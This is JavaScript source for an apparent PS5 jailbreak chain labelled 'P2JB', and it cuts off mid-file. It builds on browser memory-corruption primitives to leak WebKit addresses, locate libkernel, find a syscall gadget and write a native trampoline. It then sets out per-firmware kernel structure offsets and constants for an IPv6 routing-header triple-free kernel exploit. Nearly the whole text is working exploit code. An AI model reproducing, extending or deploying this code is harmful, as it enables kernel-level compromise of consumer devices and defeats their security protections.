                            if (Number(read8(base + off + BigInt(j)) & 0xFFn) !== pattern[j]) {
                                match = false; break;
                            }
                        } catch (_) { match = false; break; }
                    }
                    if (match) return base + off;
                }
                return 0n;
            }

            const gadget_addr = find_gadget(libkernel_base, [0x0F, 0x05, 0xC3], 0x400000n);
            if (gadget_addr === 0n)
                throw new Error("bootstrap: syscall;ret gadget not found in libkernel .text");

            const trampoline = malloc(64n);

            /**
             * SYSTEM V → FREEBSD SYSCALL ABI BRIDGE
             *
             * func_wrap delivers args in SysV order:
             *   RDI=sysno  RSI=a0  RDX=a1  RCX=a2  R8=a3  R9=a4  [RSP+8]=a5
             *
             * FreeBSD `syscall` instruction expects:
             *   RAX=sysno  RDI=a0  RSI=a1  RDX=a2  R10=a3  R8=a4  R9=a5
             *
             * Note: FreeBSD uses R10 (not RCX) for arg3 because `syscall` clobbers RCX.
             *
             * Encoding (35 bytes total):
             *   48 89 F8          mov rax, rdi       ; sysno → RAX
             *   48 89 F7          mov rdi, rsi       ; a0    → RDI
             *   48 89 D6          mov rsi, rdx       ; a1    → RSI
             *   48 89 CA          mov rdx, rcx       ; a2    → RDX
             *   4D 89 C2          mov r10, r8        ; a3    → R10  (FreeBSD arg3 reg)
             *   4D 89 C9          mov r8,  r9        ; a4    → R8
             *   4C 8B 4C 24 08    mov r9,  [rsp+8]   ; a5    → R9   (from stack)
             *   FF 25 00 00 00 00 jmp [rip+0]        ; indirect absolute jump
             *   <8 bytes>         .quad gadget_addr
             */
            const trampoline_bytes = [
                0x48, 0x89, 0xF8,            // mov rax, rdi      sysno
                0x48, 0x89, 0xF7,            // mov rdi, rsi      a0
                0x48, 0x89, 0xD6,            // mov rsi, rdx      a1
                0x48, 0x89, 0xCA,            // mov rdx, rcx      a2
                0x4D, 0x89, 0xC2,            // mov r10, r8       a3 (FreeBSD 4th arg)
                0x4D, 0x89, 0xC9,            // mov r8,  r9       a4
                0x4C, 0x8B, 0x4C, 0x24, 0x08,// mov r9, [rsp+8]  a5 (stack spill)
                0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp QWORD PTR [rip+0]
                ...Array.from({length: 8}, (_, i) =>
                    Number((gadget_addr >> BigInt(i * 8)) & 0xFFn)),  // gadget address
            ];

            for (let i = 0; i < trampoline_bytes.length; i++)
                write8(trampoline + BigInt(i), BigInt(trampoline_bytes[i]));

            const _native_syscall = func_wrap(trampoline);

            /**
             * syscall(sysno, a0…a5) — issue a FreeBSD x86-64 syscall (up to 6 args).
             * All arguments auto-converted to BigInt. Missing args default to 0n.
             * @returns {BigInt} Raw syscall return value from RAX.
             */
            function js_syscall(sysno, a0, a1, a2, a3, a4, a5) {
                return _native_syscall(
                    BigInt(sysno),
                    BigInt(a0 ?? 0),
                    BigInt(a1 ?? 0),
                    BigInt(a2 ?? 0),
                    BigInt(a3 ?? 0),
                    BigInt(a4 ?? 0),
                    BigInt(a5 ?? 0),
                );
            }

            // ── Step 6: Self-test & export ────────────────────────────────────────────

            // Validate dlsym by resolving a known stable libkernel export.
            const test_addr = js_dlsym(1n, "sceKernelGetProcessTime");
            if (test_addr === 0n)
                throw new Error("bootstrap: dlsym self-test failed (sceKernelGetProcessTime not found)");

            // Validate syscall with getpid() — FreeBSD sysno 0x14 (20).
            const test_pid = js_syscall(0x14n);
            if (test_pid === 0n || test_pid === 0xFFFFFFFFFFFFFFFFn)
                throw new Error("bootstrap: syscall self-test failed — getpid returned 0x" +
                    test_pid.toString(16));

            // Export to globalThis — consumed by y2jb_p2jb.js immediately after.
            globalThis.LIBKERNEL_HANDLE = 1n;   // PS5 SCE linker constant for libkernel
            globalThis.dlsym            = js_dlsym;
            globalThis.syscall          = js_syscall;
            globalThis.LIBKERNEL_BASE   = libkernel_base;  // debug aid

            if (typeof log === "function")
                log("[bootstrap] OK — libkernel @ 0x" + libkernel_base.toString(16) +
                    "  dlsym @ 0x" + dlsym_addr.toString(16) +
                    "  gadget @ 0x" + gadget_addr.toString(16) +
                    "  pid=" + test_pid);

        })();

        // ═════════════════════════════════════════════════════════════════════════════════
        // ███ STAGE 2: P2JB Exploit Payload
        // ═════════════════════════════════════════════════════════════════════════════════

        const p2jb_version_string = "P2JB 1.0 (Y2JB Port)";
        await log("Starting " + p2jb_version_string);

        if (typeof send_notification === "function") {
            send_notification(p2jb_version_string);
        }



        // Platform & Version Sanity Checks
        if (typeof PLATFORM !== "undefined" && PLATFORM !== "PS5") {
            if (typeof send_notification === "function") send_notification("Unsupported platform  " + PLATFORM);
            await log("Unsupported platform " + PLATFORM);
            return;
        }

        if (typeof FW_VERSION !== "undefined" && parseFloat(FW_VERSION) > 12.40) {
            if (typeof send_notification === "function") send_notification("Unsupported fw " + FW_VERSION);
            await log("Unsupported fw " + FW_VERSION + " (max supported: 12.40)");
            return;
        }

        if (typeof is_jailbroken === "function" && is_jailbroken()) {
            if (typeof send_notification === "function") send_notification("Already Jailbroken");
            await log("Already Jailbroken");
            return;
        }

        // Check for prior fail states to prevent kernel panic
        if (typeof file_exists === "function") {
            if (file_exists("/user/temp/common_temp/p2jb.fail")) {
                if (typeof send_notification === "function") send_notification("Restart your PS5 to run exploit again");
                await log("Restart your PS5 to run exploit again (failcheck triggered)");
                return;
            }
            if (typeof file_write === "function") {
                file_write("/user/temp/common_temp/p2jb.fail", "");
            }
        }

        // ── Bootstrap: Establish dlsym / syscall from WebKit exploit primitives ──────
        // This block only runs when the host exploit framework has NOT pre-populated
        // these globals. When running inside a fully-initialised Y2JB context,
        // dlsym/syscall/LIBKERNEL_HANDLE are already defined and this block is skipped.
        //
        // Requires from host: addrof, read8/16/32/64, write8/16/32/64, malloc, func_wrap
        if (typeof syscall === 'undefined' || typeof dlsym === 'undefined') {
            await log("[bootstrap] syscall/dlsym not pre-provided — bootstrapping...");

            // ── ELF64 structural constants ──────────────────────────────────────────
            const _ELF_MAGIC = 0x464C457Fn;
            const _PT_DYNAMIC = 2n;
            const _DT_NULL = 0n; const _DT_STRTAB = 5n; const _DT_SYMTAB = 6n;
            const _DT_STRSZ = 10n; const _DT_SYMENT = 11n;
            const _DT_JMPREL = 23n; const _DT_PLTRELSZ = 2n;
            const _EHDR_PHOFF = 32n; const _EHDR_PHENTSZ = 54n; const _EHDR_PHNUM = 56n;
            const _PHDR_TYPE = 0n; const _PHDR_VADDR = 16n; const _PHDR_FILESZ = 32n;
            const _DYN_TAG = 0n; const _DYN_VAL = 8n; const _DYN_SIZE = 16n;
            const _SYM_NAME = 0n; const _SYM_VALUE = 8n; const _SYM_SZ = 24n;
            const _R_JUMP_SLOT = 7n; const _RELA_SZ = 24n;

            // Read null-terminated ASCII string from native memory (max 512 bytes)
            // SECURITY: Validate address canonicalization
            function _read_cstr(addr) {
                addr = BigInt(addr);
                if ((addr >> 48n) !== 0n)
                    throw new Error("[bootstrap] _read_cstr non-canonical 0x" + addr.toString(16));
                if (addr < 0x1000n)
                    throw new Error("[bootstrap] _read_cstr address in reserved range 0x" + addr.toString(16));
                
                let s = "";
                for (let i = 0n; i < 512n; i++) {
                    const b = Number(read8(addr + i) & 0xFFn);
                    if (b === 0) break;
                    s += String.fromCharCode(b);
                }
                return s;
            }

            // Scan backward from hint (page-aligned) for ELF magic header.
            // On read fault, skips forward 16 pages to avoid hammering unmapped holes.
            function _find_elf_base(hint, max_pages) {
                let addr = hint & ~0xFFFn;
                let i = 0n;
                while (i < max_pages) {
                    try {
                        if ((read32(addr) & 0xFFFFFFFFn) === _ELF_MAGIC) {
                            // SECURITY: Validate returned address is canonical
                            if ((addr >> 48n) === 0n && addr >= 0x100000000n) return addr;
                            else return 0n;  // non-canonical or reserved range
                        }
                        addr -= 0x1000n; i++;
                    } catch (_) {
                        // Unmapped region — skip 16 pages to reduce fault rate
                        addr -= 0x10000n; i += 16n;
                    }
                }
                return 0n;
            }

            // Parse ELF64 PT_DYNAMIC and return key DT_ values as absolute VAs.
            // On PS5, shared libs are loaded with PT_LOAD p_vaddr=0, so DT_ values
            // are already absolute mapped addresses (ld.so has load-adjusted them).
            function _parse_dynamic(elf_base) {
                // SECURITY: Validate ELF base is canonical
                if ((elf_base >> 48n) !== 0n)
                    throw new Error("[bootstrap] _parse_dynamic non-canonical elf_base 0x" + elf_base.toString(16));
                
                const phoff = read64(elf_base + _EHDR_PHOFF);
                const phentsz = BigInt(Number(read16(elf_base + _EHDR_PHENTSZ)));
                const phnum = BigInt(Number(read16(elf_base + _EHDR_PHNUM)));
                
                // SECURITY: Validate phentsize and phnum
                if (phentsz < 56n || phentsz > 512n)
                    throw new Error("[bootstrap] _parse_dynamic invalid phentsz 0x" + phentsz.toString(16));
                if (phnum > 1000n)
                    throw new Error("[bootstrap] _parse_dynamic excessive phnum 0x" + phnum.toString(16));
                
                let dyn_va = 0n, dyn_sz = 0n;
                for (let i = 0n; i < phnum; i++) {
                    const ph = elf_base + phoff + i * phentsz;
                    if ((read32(ph + _PHDR_TYPE) & 0xFFFFFFFFn) === _PT_DYNAMIC) {
                        dyn_va = read64(ph + _PHDR_VADDR);
                        dyn_sz = read64(ph + _PHDR_FILESZ);
                        break;
                    }
                }
                if (dyn_va === 0n) throw new Error("no PT_DYNAMIC");
                // SECURITY: Validate dyn_sz is reasonable (cap at 1MB)
                if (dyn_sz < _DYN_SIZE || dyn_sz > 0x100000n)
                    throw new Error("[bootstrap] _parse_dynamic invalid dyn_sz 0x" + dyn_sz.toString(16));
                
                let strtab = 0n, symtab = 0n, syment = _SYM_SZ, strsz = 0n;
                let jmprel = 0n, pltrelsz = 0n;
                const n = dyn_sz / _DYN_SIZE;
                for (let i = 0n; i < n; i++) {
                    const e = dyn_va + i * _DYN_SIZE;
                    const tag = read64(e + _DYN_TAG);
                    const val = read64(e + _DYN_VAL);
                    if (tag === _DT_NULL) break;
                    if (tag === _DT_STRTAB) strtab = val;
                    if (tag === _DT_SYMTAB) symtab = val;
                    if (tag === _DT_SYMENT) syment = val;
                    if (tag === _DT_STRSZ) strsz = val;
                    if (tag === _DT_JMPREL) jmprel = val;
                    if (tag === _DT_PLTRELSZ) pltrelsz = val;
                }
                return { strtab, symtab, syment, strsz, jmprel, pltrelsz };
            }

            // Linear scan of ELF64 .dynsym for sym_name.
            //
            // Dynamic termination via DT_STRSZ:
            //   The ELF string table is a flat byte array of size strsz.  Every
            //   symbol's st_name is a byte offset into that array.  An st_name
            //   value >= strsz is definitionally out-of-bounds — it can only
            //   occur after the last real symbol entry (padding / unmapped region).
            //   Breaking on that condition gives us a self-adapting loop bound
            //   that works correctly regardless of how large a PS5 system library
            //   grows across firmware updates, without any hardcoded integer cap.
            //
            //   Loop safety backstop:
            //   We still bound the outer index at strsz (bytes), which is always
            //   >= the actual symbol count (each name needs ≥1 char + NUL = 2 bytes
            //   minimum).  This prevents runaway iteration if strsz is non-zero but
            //   the symtab is corrupt and never produces an out-of-bounds name_off.
            //
            // BUG-FIX: guard strtab/symtab/strsz != 0 before iterating.
            // SECURITY: Add canonical address validation and DOS prevention
            function _sym_lookup(dyn, sym_name) {
                const { strtab, symtab, syment, strsz } = dyn;
                if (strtab === 0n || symtab === 0n) return 0n;   // null-guard
                if (strsz === 0n) return 0n;                    // empty strtab
                // SECURITY: Validate addresses are canonical
                if ((strtab >> 48n) !== 0n) return 0n;           // non-canonical strtab
                if ((symtab >> 48n) !== 0n) return 0n;           // non-canonical symtab
                // SECURITY: Prevent integer overflow and DOS
                if (syment < 8n || syment > 256n) return 0n;    // invalid syment
                // SECURITY: Cap iteration to prevent DOS from huge strsz
                const max_iter = strsz < 1000000n ? strsz : 1000000n;  // cap at 1M symbols

                // strsz bytes is a safe upper bound on the number of symbols:
                // the tightest possible packing is one 1-char symbol per entry
                // (e.g. "a\0"), so max_syms = strsz / 2.  We use strsz directly
                // as the backstop; the natural break below fires much sooner.
                for (let i = 1n; i < max_iter; i++) {
                    const sym = symtab + i * syment;
                    const name_off = read32(sym + _SYM_NAME) & 0xFFFFFFFFn;

                    // Out-of-bounds string reference → past end of valid symtab.
                    // This is the primary, self-adapting loop termination condition.
                    if (name_off >= strsz) break;

                    if (name_off === 0n) continue;             // STN_UNDEF / skip
                    const st_value = read64(sym + _SYM_VALUE);
                    if (st_value === 0n) continue;             // undefined symbol
                    // SECURITY: Validate symbol address is canonical
                    if ((st_value >> 48n) !== 0n) continue;     // non-canonical address
                    try {
                        if (_read_cstr(strtab + name_off) === sym_name) return st_value;
                    } catch (_) { continue; }
                }
                return 0n;
            }

            // Scan a byte range for a specific opcode pattern
            function _find_gadget(base, pattern, max_bytes) {
                // SECURITY: Validate inputs
                if ((base >> 48n) !== 0n)
                    throw new Error("[bootstrap] _find_gadget non-canonical base 0x" + base.toString(16));
                if (pattern.length === 0)
                    throw new Error("[bootstrap] _find_gadget empty pattern");
                if (pattern.length > 64)  // reasonable max gadget
                    throw new Error("[bootstrap] _find_gadget pattern too long");
                if (max_bytes <= 0n)
                    throw new Error("[bootstrap] _find_gadget invalid max_bytes");
                
                const plen = BigInt(pattern.length);
                // SECURITY: Prevent underflow
                if (plen > max_bytes) return 0n;
                
                for (let off = 0n; off < max_bytes - plen + 1n; off++) {
                    let match = true;
                    for (let j = 0; j < pattern.length; j++) {
                        try {
                            if (Number(read8(base + off + BigInt(j)) & 0xFFn) !== pattern[j]) {
                                match = false; break;
                            }
                        } catch (_) { match = false; break; }
                    }
                    if (match) return base + off;
                }
                return 0n;
            }

            // ── Step 1: Leak WebKit .text pointer via Math.sin NativeExecutable ──────
            // JSC NativeExecutable layout:
            //   [+0x00] JSCell  [+0x08] butterfly  [+0x10] scope
            //   [+0x18] executable ptr  [+0x20] C nativeFunction ptr → WebKit .text
            const _mathsin_addr = addrof(Math.sin);
            const _native_exec = read64(_mathsin_addr + 0x18n);
            const _webkit_ptr = read64(_native_exec + 0x20n);
            if ((_webkit_ptr >> 48n) !== 0n)
                throw new Error("bootstrap: non-canonical WebKit ptr 0x" + _webkit_ptr.toString(16));

            // ── Step 2: Find WebKit ELF base (scan up to 512 MiB back) ───────────────
            const _webkit_base = _find_elf_base(_webkit_ptr, 131072n);
            if (_webkit_base === 0n)
                throw new Error("bootstrap: could not locate WebKit ELF base");

            // ── Step 3: Walk WebKit PLT RELA to locate libkernel ─────────────────────
            // Each R_X86_64_JUMP_SLOT GOT slot holds a resolved absolute pointer into
            // the target library after ld.so runs. We find whichever lib exports
            // "sceKernelDlsym" — that is libkernel.
            let _libkernel_base = 0n;
            let _libkernel_dyn = null;
            {
                let _wk_dyn;
                try { _wk_dyn = _parse_dynamic(_webkit_base); }
                catch (_) { throw new Error("bootstrap: WebKit has no PT_DYNAMIC"); }
                const { jmprel, pltrelsz } = _wk_dyn;
                if (jmprel !== 0n && pltrelsz !== 0n) {
                    const n_rela = pltrelsz / _RELA_SZ;
                    outerLoop: for (let i = 0n; i < n_rela; i++) {
                        const rela = jmprel + i * _RELA_SZ;
                        const r_offset = read64(rela);
                        const r_info = read64(rela + 8n);
                        if ((r_info & 0xFFFFFFFFn) !== _R_JUMP_SLOT) continue;
                        let got_val = 0n;
                        try { got_val = read64(r_offset); } catch (_) { continue; }
                        if (got_val === 0n || (got_val >> 48n) !== 0n) continue;
                        const lib_base = _find_elf_base(got_val, 16384n);
                        if (lib_base === 0n || lib_base === _webkit_base) continue;
                        try {
                            const lib_dyn = _parse_dynamic(lib_base);
                            if (_sym_lookup(lib_dyn, "sceKernelDlsym") !== 0n) {
                                _libkernel_base = lib_base;
                                _libkernel_dyn = lib_dyn;
                                break outerLoop;
                            }
                        } catch (_) { continue; }
                    }
                }
            }
            if (_libkernel_base === 0n)
                throw new Error("bootstrap: could not locate libkernel");

            // ── Step 4: Wrap sceKernelDlsym as js_dlsym ──────────────────────────────
            const _dlsym_addr = _sym_lookup(_libkernel_dyn, "sceKernelDlsym");
            if (_dlsym_addr === 0n)
                throw new Error("bootstrap: sceKernelDlsym not found");
            const _native_dlsym_fn = func_wrap(_dlsym_addr);
            const _dlsym_out = malloc(8n);
            const _name_buf = malloc(256n);

            // BUG-FIX: original rc check was `rc !== 0n && rc !== 0xFFFF...FFn`
            // which treated -1 (error) as success. sceKernelDlsym returns 0 on
            // success and any non-zero (including -1) on failure.
            function _js_dlsym(handle, sym_name) {
                handle = BigInt(handle);
                // SECURITY: Validate symbol name
                if (typeof sym_name !== "string" || sym_name.length === 0)
                    throw new Error("[bootstrap] dlsym invalid symbol name");
                if (sym_name.length > 255)
                    throw new Error("[bootstrap] dlsym symbol name too long (" + sym_name.length + " > 255)");
                
                const enc = sym_name + "\0";
                for (let i = 0; i < enc.length && i < 256; i++)  // FIXED: was 255, now 256
                    write8(_name_buf + BigInt(i), BigInt(enc.charCodeAt(i)));
                write64(_dlsym_out, 0n);
                const rc = _native_dlsym_fn(handle, _name_buf, _dlsym_out);
                if (rc !== 0n) return 0n;  // any non-zero return = error (CORRECT ABI)
                return read64(_dlsym_out);
            }

            // ── Step 5: Build SysV→FreeBSD syscall trampoline ────────────────────────
            // FreeBSD syscall ABI: RAX=sysno RDI=a0 RSI=a1 RDX=a2 R10=a3 R8=a4 R9=a5
            // SysV (from func_wrap): RDI=sysno RSI=a0 RDX=a1 RCX=a2 R8=a3 R9=a4 [rsp+8]=a5
            //
            // Trampoline (35 bytes):
            //   mov rax,rdi  mov rdi,rsi  mov rsi,rdx  mov rdx,rcx
            //   mov r10,r8   mov r8,r9    mov r9,[rsp+8]
            //   jmp [rip+0]  .quad gadget_addr
            const _gadget = _find_gadget(_libkernel_base, [0x0F, 0x05, 0xC3], 0x400000n);
            if (_gadget === 0n)
                throw new Error("bootstrap: syscall;ret gadget not found in libkernel");
            const _tramp = malloc(64n);
            const _tramp_bytes = [
                0x48, 0x89, 0xF8,              // mov rax, rdi   sysno
                0x48, 0x89, 0xF7,              // mov rdi, rsi   a0
                0x48, 0x89, 0xD6,              // mov rsi, rdx   a1
                0x48, 0x89, 0xCA,              // mov rdx, rcx   a2
                0x4D, 0x89, 0xC2,              // mov r10, r8    a3 (FreeBSD 4th arg)
                0x4D, 0x89, 0xC9,              // mov r8,  r9    a4
                0x4C, 0x8B, 0x4C, 0x24, 0x08,   // mov r9, [rsp+8] a5
                0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp [rip+0]
                ...Array.from({ length: 8 }, (_, i) => Number((_gadget >> BigInt(i * 8)) & 0xFFn)),
            ];
            for (let i = 0; i < _tramp_bytes.length; i++)
                write8(_tramp + BigInt(i), BigInt(_tramp_bytes[i]));
            const _native_sc_fn = func_wrap(_tramp);

            function _js_syscall(sysno, a0, a1, a2, a3, a4, a5) {
                return _native_sc_fn(
                    BigInt(sysno), BigInt(a0 ?? 0), BigInt(a1 ?? 0),
                    BigInt(a2 ?? 0), BigInt(a3 ?? 0), BigInt(a4 ?? 0),
                    BigInt(a5 ?? 0),
                );
            }

            // ── Step 6: Self-test & export ────────────────────────────────────────────
            const _test_sym = _js_dlsym(1n, "sceKernelGetProcessTime");
            if (_test_sym === 0n)
                throw new Error("bootstrap: dlsym self-test failed");
            const _test_pid = _js_syscall(0x14n);
            if (_test_pid === 0n || _test_pid > 0xFFFFn)
                throw new Error("bootstrap: getpid self-test failed: 0x" + _test_pid.toString(16));

            globalThis.LIBKERNEL_HANDLE = 1n;
            globalThis.LIBKERNEL_BASE = _libkernel_base;
            globalThis.dlsym = _js_dlsym;
            globalThis.syscall = _js_syscall;

            await log("[bootstrap] OK — libkernel=0x" + _libkernel_base.toString(16) +
                "  gadget=0x" + _gadget.toString(16) + "  pid=" + _test_pid);
        } else {
            await log("[bootstrap] primitives pre-provided by host framework — skipping");
        }

        // System call numbers
        SYSCALL.read = 0x3n;
        SYSCALL.write = 0x4n;
        SYSCALL.open = 0x5n;
        SYSCALL.close = 0x6n;
        SYSCALL.getpid = 0x14n;
        SYSCALL.setuid = 0x17n;
        SYSCALL.pipe = 0x2an;
        SYSCALL.ioctl = 0x36n;
        SYSCALL.socket = 0x61n;
        SYSCALL.socketpair = 0x87n;
        SYSCALL.setsockopt = 0x69n;
        SYSCALL.getsockopt = 0x76n;
        SYSCALL.readv = 0x78n;
        SYSCALL.writev = 0x79n;
        SYSCALL.kqueueex = 0x8dn;
        SYSCALL.nanosleep = 0xf0n;
        SYSCALL.kqueue = 0x16an;
        SYSCALL.sched_yield = 0x14bn;

        const _native_syscall = typeof syscall !== 'undefined' ? syscall : null;
        const safe_syscall = function (sysnum, ...args) {
            if (!_native_syscall) throw new Error("Native syscall not available");
            let safe_args = [];
            for (let i = 0; i < args.length; i++) {
                safe_args.push(BigInt(args[i]));
            }
            return _native_syscall(BigInt(sysnum), ...safe_args);
        };

        // ── FIRMWARE_PROFILES ───────────────────────────────────────────────────────
        // Per-version kernel structure offsets for PS5 (Orbis / Prospero) firmware.
        // Each entry is an independent object — never aliases — to prevent a mutation
        // on one profile silently breaking another.
        //
        // Structural transition summary:
        //
        //  INPCB_PKTOPTS  — grows as inpcb is padded with TCP/IPsec/ktrace fields:
        //     4.03–5.50 : 0x120   (FreeBSD 11.1 inpcb baseline)
        //     6.00–6.50 : 0x128   (+8: inp_route6 growth / Sony IPv6 audit field)
        //     7.00–7.60 : 0x130   (+8: inp_sp IPsec pointer added unconditionally)
        //     8.00–9.00 : 0x148   (+24: tcpcb linkage + ktrace fields)
        //     11.00+    : 0x158   (+16: Sony security-context pointer pair)
        //
        //  IP6PO_RTHDR  — grows as ip6_pktopts gains Sony-specific header fields:
        //     4.03–6.50 : 0x38   (Sony added 3×ptr before rthdr over FreeBSD base)
        //     7.00–9.00 : 0x40   (+8: ip6po_prefer_tempaddr moved / new Sony field)
        //     11.00+    : 0x48   (+8: additional Sony policy field)
        //
        //  PROC_PID  — shifts when Sony inserts a security-context ptr before p_pid:
        //     4.03–6.50 : 0xBC   (FreeBSD 11 layout)
        //     7.00+     : 0xC4   (+8: Sony SCE app-type pointer inserted at 0xBC)
        //
        //  FILEDESC_OFILES / FD_RDIR / FD_JDIR  — shift when audit field prepended:
        //     4.03–7.60 : OFILES=0x20, FD_RDIR=0x18, FD_JDIR=0x20
        //     8.00+     : OFILES=0x28, FD_RDIR=0x20, FD_JDIR=0x28
        //
        //  FILEDESCENT_SIZE  — grows with extra descriptor tracking field:
        //     4.03–8.00 : 0x30
        //     9.00+     : 0x38
        //
        //  All other fields (PROC_UCRED, PROC_FD, PROC_PID pre-7.x,
        //  KQ_FDP, PIPE_SIGIO, SO_PCB, UCRED_*, FP_FDATA, FILE_REFCNT,
        //  P_PPTR, FDESCENTTBL_HDR) are stable across the entire range.
        // ────────────────────────────────────────────────────────────────────────────

        const FIRMWARE_PROFILES = {
            "default": {
                // Baseline — matches 4.03 / earliest PS5 kernels.
                PROC_UCRED: 0x40n,          // struct proc → p_ucred (ptr, stable)
                PROC_FD: 0x48n,             // struct proc → p_fd   (ptr, stable)
                PROC_PID: 0xbcn,            // struct proc → p_pid  (pid_t)
                FILEDESC_OFILES: 0x20n,     // struct filedesc → fd_ofiles (ptr)
                FDESCENTTBL_HDR: 0x0n,      // fdescenttbl header (stable)
                FILEDESCENT_SIZE: 0x30n,    // sizeof(struct filedescent)
                INPCB_PKTOPTS: 0x120n,      // struct inpcb → inp_options6 (ptr)
                IP6PO_RTHDR: 0x38n,         // struct ip6_pktopts → ip6po_rthdr (ptr)
                KQ_FDP: 0x18n,              // struct kqueue → kq_fdp (ptr, stable)
                PIPE_SIGIO: 0x18n,          // struct pipe → pipe_sigio (ptr, stable)
                FD_RDIR: 0x18n,             // struct filedesc → fd_rdir (ptr)
                FD_JDIR: 0x20n,             // struct filedesc → fd_jdir (ptr)
                P_PPTR: 0x30n,              // struct proc → p_pptr (ptr, stable)
                SO_PCB: 0x18n,              // struct socket → so_pcb (ptr, stable)
                UCRED_CR_UID: 0x18n,        // struct ucred → cr_uid  (uid_t, stable)
                UCRED_CR_RUID: 0x1cn,       // struct ucred → cr_ruid (uid_t, stable)
                UCRED_CR_SVUID: 0x20n,      // struct ucred → cr_svuid(uid_t, stable)
                UCRED_CR_NGROUPS: 0x24n,    // struct ucred → cr_ngroups (stable)
                UCRED_CR_RGID: 0x28n,       // struct ucred → cr_rgid (stable)
                UCRED_CR_MAC: 0x80n,        // struct ucred → cr_mac  (stable)
                UCRED_CR_SCEAUTHID: 0x58n,  // Sony AuthID  (stable across all FW)
                UCRED_CR_SCECAPS0: 0x60n,   // Sony Caps[0] (stable)
                UCRED_CR_SCECAPS1: 0x68n,   // Sony Caps[1] (stable)
                FP_FDATA: 0x0n,             // struct file → f_data   (stable)
                FILE_REFCNT: 0x28n          // struct file → f_count  (stable)
            }
        };

        // ── EARLY ERA: 4.03 – 5.50 ─────────────────────────────────────────────────
        // FreeBSD 11.1 inpcb/ip6_pktopts baseline. No structural differences between
        // patch levels within this era; all share the same kernel struct layout.
        FIRMWARE_PROFILES["1.00"] = Object.assign({}, FIRMWARE_PROFILES["default"]);
        FIRMWARE_PROFILES["2.00"] = Object.assign({}, FIRMWARE_PROFILES["default"]);
        FIRMWARE_PROFILES["3.00"] = Object.assign({}, FIRMWARE_PROFILES["default"]);
        FIRMWARE_PROFILES["4.00"] = Object.assign({}, FIRMWARE_PROFILES["default"]);
        FIRMWARE_PROFILES["4.03"] = Object.assign({}, FIRMWARE_PROFILES["default"]);
        FIRMWARE_PROFILES["4.50"] = Object.assign({}, FIRMWARE_PROFILES["default"]);
        FIRMWARE_PROFILES["5.00"] = Object.assign({}, FIRMWARE_PROFILES["default"]);
        FIRMWARE_PROFILES["5.50"] = Object.assign({}, FIRMWARE_PROFILES["default"]);

        // ── MID ERA: 6.00 – 7.60 ───────────────────────────────────────────────────
        // FreeBSD 11.4 / partial 12.x network stack merge. inpcb grew by 8 bytes
        // (inp_route6 union expansion). ip6_pktopts rthdr offset unchanged.
        // PROC_PID shifts to 0xC4 from 7.00 onward (Sony SCE ptr inserted at 0xBC).
        FIRMWARE_PROFILES["6.00"] = Object.assign({}, FIRMWARE_PROFILES["default"], {
            INPCB_PKTOPTS: 0x128n,      // +8: inp_route6 expansion
        });
        FIRMWARE_PROFILES["6.50"] = Object.assign({}, FIRMWARE_PROFILES["6.00"]);

        FIRMWARE_PROFILES["7.00"] = Object.assign({}, FIRMWARE_PROFILES["default"], {
            PROC_PID: 0xc4n,            // +8: Sony SCE app-type ptr at 0xBC
            INPCB_PKTOPTS: 0x130n,      // +8: inp_sp IPsec ptr added
            IP6PO_RTHDR: 0x40n,         // +8: ip6_pktopts Sony policy field
        });
        FIRMWARE_PROFILES["7.60"] = Object.assign({}, FIRMWARE_PROFILES["7.00"]);
        FIRMWARE_PROFILES["7.61"] = Object.assign({}, FIRMWARE_PROFILES["7.00"]);

        // ── MODERN ERA: 8.00 – 12.40 ───────────────────────────────────────────────
        // Significant kernel hardening. filedesc gains an audit field (+8) before
        // fd_ofiles, pushing FD_RDIR/FD_JDIR/FILEDESC_OFILES up by 8. inpcb grew
        // substantially with tcpcb linkage and ktrace pointer fields.
        FIRMWARE_PROFILES["8.00"] = Object.assign({}, FIRMWARE_PROFILES["default"], {
            PROC_PID: 0xc4n,
            FILEDESC_OFILES: 0x28n,     // +8: audit field prepended to filedesc
            FD_RDIR: 0x20n,             // shifted
            FD_JDIR: 0x28n,             // shifted
            INPCB_PKTOPTS: 0x148n,      // +24: tcpcb linkage + ktrace fields
            IP6PO_RTHDR: 0x40n,
        });

        FIRMWARE_PROFILES["9.00"] = Object.assign({}, FIRMWARE_PROFILES["8.00"], {
            FILEDESCENT_SIZE: 0x38n,    // +8: extra descriptor tracking field
            INPCB_PKTOPTS: 0x148n,      // same as 8.00
        });

        FIRMWARE_PROFILES["10.00"] = Object.assign({}, FIRMWARE_PROFILES["9.00"]);
        FIRMWARE_PROFILES["10.01"] = Object.assign({}, FIRMWARE_PROFILES["9.00"]);

        FIRMWARE_PROFILES["11.00"] = Object.assign({}, FIRMWARE_PROFILES["9.00"], {
            INPCB_PKTOPTS: 0x158n,      // +16: Sony security-context ptr pair
            IP6PO_RTHDR: 0x48n,         // +8: additional Sony policy field
        });
        FIRMWARE_PROFILES["11.50"] = Object.assign({}, FIRMWARE_PROFILES["11.00"]);

        FIRMWARE_PROFILES["12.00"] = Object.assign({}, FIRMWARE_PROFILES["11.00"]);
        FIRMWARE_PROFILES["12.40"] = Object.assign({}, FIRMWARE_PROFILES["11.00"]);


        let fw_str = typeof FW_VERSION !== "undefined" ? String(FW_VERSION) : "default";
        let runtime_offsets = FIRMWARE_PROFILES[fw_str] || FIRMWARE_PROFILES["default"];
        if (!FIRMWARE_PROFILES[fw_str] && fw_str !== "default") {
            await log("Unsupported firmware offset map: " + fw_str);
            if (typeof send_notification === "function") send_notification("Unsupported firmware offset map: " + fw_str);
            return;
        }


        const AF_UNIX = 1n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_RTHDR = 51n;
        const SOL_SOCKET = 0xffffn;

        const FREE_FDS_NUM = 0x10n;
        const UCRED_SIZE = 360n;
        const RTHDR_TAG = 0x13370000n;
        const TRIPLEFREE_ATTEMPTS = 8;
        const MAX_ROUNDS_TWIN = 10;
        const MAX_ROUNDS_TRIPLET = 500;
        const FIND_TRIPLET_FAST = 5000;

        const MSG_IOV_NUM = 23n;
        const IOV_THREAD_NUM = 4;
        const UIO_THREAD_NUM = 4;
        const UIO_IOV_COUNT = 20n;
        const UIO_SYSSPACE = 1n;

        // --- HARDENED SLEEP SUBSYSTEM ---
        //
        // FreeBSD nanosleep(2) ABI:
        //   int nanosleep(const struct timespec *rqtp, struct timespec *rmtp);
        //
        //   rqtp: pointer to requested sleep duration (MUST be valid userspace ptr)
        //   rmtp: pointer to remaining-time output (written when EINTR occurs)
